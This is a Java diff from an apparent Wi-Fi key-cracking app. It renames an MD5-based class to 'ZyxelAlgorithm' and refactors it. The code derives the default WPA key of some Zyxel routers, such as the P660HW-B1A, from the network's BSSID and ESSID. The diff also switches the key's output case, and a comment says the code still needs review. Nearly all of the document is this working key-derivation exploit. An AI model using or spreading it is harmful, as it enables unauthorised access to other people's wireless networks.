@@ -6,15 +6,21 @@ import java.security.NoSuchAlgorithmException;
 
 import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;
 
-public class Md5ZAlgorithm extends CrackAlgorithm {
+/**
+ * Zyxel algorithm.
+ * This exploits a vulnerability in the following routers:
+ * ZYXEL P660HW-B1A
+ * 
+ * Unsuported / to be done:
+ * P660HW-D1
+ * NOTE: This stills need to be reviewed...
+ */
+public class ZyxelAlgorithm extends CrackAlgorithm {
 
-	/*
-	 * MD5Z algorithm.
-	 * Used by some Zyxel routers from Movistar
-	 * and Jazztel in Spain and in other countries
+	/**
+	 * {@inheritDoc}
 	 */
-
-	public Md5ZAlgorithm(String essid, String bssid) {
+	public ZyxelAlgorithm(String essid, String bssid) {
 		super(essid, bssid);
 	}
 
@@ -81,20 +87,14 @@ public class Md5ZAlgorithm extends CrackAlgorithm {
 	protected String crackAlgorithm(String essid_data, String bssid_data) {
 		essid_data = essid_data.toUpperCase();
 		bssid_data = bssid_data.replace(":", "").toUpperCase();
-		String preMD5 = bssid_data.substring(0, 8).toLowerCase()
-				+ (essid_data.substring(essid_data.length() - 4, essid_data.length())).toLowerCase();
-		return getMD5(preMD5).toUpperCase();
+   		return MD5Hash(bssid_data.substring(0,8).toLowerCase()+essid_data.substring(essid_data.length()-4, essid_data.length()).toLowerCase()).toLowerCase();	
 	}
 
-	private static String getMD5(String input) {
+	private static String MD5Hash(String input) {
 		try {
-			MessageDigest md = MessageDigest.getInstance("MD5");
-			byte[] messageDigest = md.digest(input.getBytes());
-			BigInteger number = new BigInteger(1, messageDigest);
-			String hashtext = number.toString(16);
-			while (hashtext.length() < 20) {
+			String hashtext = (new BigInteger(1, MessageDigest.getInstance("MD5").digest(input.getBytes()))).toString(16);
+			while (hashtext.length() < 20)
 				hashtext = "0" + hashtext;
-			}
 			return hashtext.substring(0, 20);
 		} catch (NoSuchAlgorithmException e) {
 			throw new RuntimeException(e);
@@ -102,6 +102,6 @@ public class Md5ZAlgorithm extends CrackAlgorithm {
 	}
 
 	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
-		return (mCapabilities.equals(WirelessEncryption.WPA)) ? true : false;
+		return mCapabilities.equals(WirelessEncryption.WPA);
 	}
 }
